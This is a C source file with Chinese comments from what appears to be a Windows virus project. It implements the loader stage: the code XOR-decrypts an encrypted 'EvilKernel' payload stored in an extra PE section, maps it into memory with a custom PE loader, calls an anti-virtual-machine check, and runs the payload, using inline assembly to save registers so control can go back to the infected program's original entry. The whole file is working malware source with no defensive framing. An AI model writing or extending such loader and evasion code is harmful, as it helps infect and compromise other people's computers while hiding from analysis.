#include "xVirusDll.h"
#include "EvilKernel.h"
#include <Windows.h>

#include "..\Common\xVirusSupport.c"

/*
 * 全局变量
 */
XVIRUSDLL_ARG g_xVirusDllArg = {0};

/*
 * 运行主函数
 */
__bool __API__ xVirusRun(__dword hModule, __dword ul_reason_for_call, __memory lpReserved) {
	/*
	 * 这里主要负责加载DLL到内存
	 */
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	PIMAGE_SECTION_HEADER pEvilSectionHdr = NULL;
	__memory pMem = NULL;
#if defined(__PRINT_DBG_INFO__)
	__dword dwPrintDbgInfoHandle = 0;
#endif

#if defined(__PRINT_DBG_INFO__)
	dwPrintDbgInfoHandle = __PrintDbgInfo_RecordToFileInit__("xVirusDllLog.txt");
#endif

	__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get basic information\r\n");
	pMem = (__memory)hModule;
	pNtHdr = __GetNtHeader__(pMem);
	pEvilSectionHdr = GetEvilSectionHeader(pNtHdr);

	/*
	 * 取出病毒加载DLL
	 * 并通过PE LOADER将其加载到内存
	 * 执行病毒执行DLL
	 */
	__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get EvilKernel && load it to memory\r\n");
	{
		__integer iEvilKernelSize = 0;
		__memory pEvilKernel = NULL;
		__memory pEvilKernelBuffer = NULL;
		__dword dwKey = 0;//解密邪恶核心的密钥

		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get EvilKernel decode key\r\n");
		/*
		 * 计算邪恶核心的解密KEY
		 */
		dwKey = __XVIRUS_DLL_DECODE_KEY__;
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "EvilKernel decode key = ");
		__PrintDbgInfo_RecordIntegerToFile__(dwPrintDbgInfoHandle, dwKey);
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "\r\n");

		// 解密邪恶核心
		pEvilKernel = pMem + pEvilSectionHdr->VirtualAddress;
		iEvilKernelSize = pEvilSectionHdr->Misc.VirtualSize;
		pEvilKernelBuffer = __logic_new_size__(iEvilKernelSize);
		if (!pEvilKernelBuffer) return FALSE;
		XorArray(dwKey, pEvilKernel, pEvilKernelBuffer, iEvilKernelSize);
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Decode EvilKernel completed\r\n");
		/*
		 * 将邪恶核心送到它该去的地方
		 */
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Load EvilKernel to memory\r\n");
		{
			__memory pEvilKernelRuntime = NULL;
			__integer iEvilKernelImageBase = 0;
			PIMAGE_NT_HEADERS pEvilKernelNtHdr = NULL;
			pEvilKernelNtHdr = __GetNtHeader__(pEvilKernelBuffer);
			iEvilKernelImageBase = pEvilKernelNtHdr->OptionalHeader.SizeOfImage;
			pEvilKernelRuntime = (__memory)__logic_new_size__(iEvilKernelImageBase);
			/*
			 * 准备PE LOADER
			 */
			{
				FPEvilKernelEntry pEvilKernelEntry = NULL;
				__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Already LoaderEvilKernel(pEvilKernelBuffer, pEvilKernelRuntime, iEvilKernelImageBase)\r\n");
				pEvilKernelEntry = LoaderEvilKernel(pEvilKernelBuffer, pEvilKernelRuntime, iEvilKernelImageBase);
				if (!pEvilKernelEntry)
					return FALSE;
				// 执行邪恶核心
				__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Invoke EvilKernel dllmain\r\n");
				__logic_delete__(pEvilKernelBuffer);
				// 对抗虚拟机
				AntiVM1();
				return pEvilKernelEntry((__dword)pEvilKernelRuntime, ul_reason_for_call, (__memory)&g_xVirusDllArg);
			}
		}
	}

	/*
	 * 这里的代码都不会被执行,除非出错
	 */

	return TRUE;
}

/*
 * 这里因为要返回到原始的调用地址,所以要记录原先的返回地址
 * 取得返回地址采用了硬编码技术
 */
__dword g_dwOrigEsp = 0;
__dword g_dwOrigEbp = 0;
__dword g_dwOrigEsi = 0;
__dword g_dwOrigEdi = 0;
__dword g_dwOrigEbx = 0;
__dword g_dwOrigEdx = 0;
__dword g_dwOrigEcx = 0;
__bool __API__ xDllMain(__dword hModule, __dword ul_reason_for_call, __memory lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		// 记录原始值
		g_xVirusDllArg.dwOrigEbp = g_dwOrigEbp;
		g_xVirusDllArg.dwOrigEsp = g_dwOrigEsp;
		g_xVirusDllArg.dwOrigEbx = g_dwOrigEbx;
		g_xVirusDllArg.dwOrigEdx = g_dwOrigEdx;
		g_xVirusDllArg.dwOrigEcx = g_dwOrigEcx;
		g_xVirusDllArg.dwOrigEdi = g_dwOrigEdi;
		g_xVirusDllArg.dwOrigEsi = g_dwOrigEsi;
		g_xVirusDllArg.addrOrigImageBase = (__address)hModule;
		xVirusRun(hModule, ul_reason_for_call, lpReserved);
		// 永远返回不到这里
		return TRUE;
	break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}

__bool __API__ DllMain(__dword hModule, __dword ul_reason_for_call, __memory lpReserved) {
	__asm {
		;; int 3
		;; 跳入到指向DLL入口
		jmp xDllMain
	}
}

/*
 * 引出函数以及变量
 */
__offset g_ofOrigEntryAddressRva = 0x19831210;//原始入口点偏移
// 这里是LoadLibrary执行后的入口点
__void __NAKED__ DllStartup(/*__dword hModule, __dword ul_reason_for_call, __memory lpReserved*/) {
	__asm {
		;;int 3
		;; 这里要记录所有原始的寄存器值
		mov g_dwOrigEsp, esp
		mov g_dwOrigEbp, ebp
		mov g_dwOrigEsi, esi
		mov g_dwOrigEdi, edi
		mov g_dwOrigEbx, ebx
		mov g_dwOrigEdx, edx
		mov g_dwOrigEcx, ecx
		jmp DllMain												; 直接跳入到入口函数,略过Startup函数
		retn 0x0C
	}
}
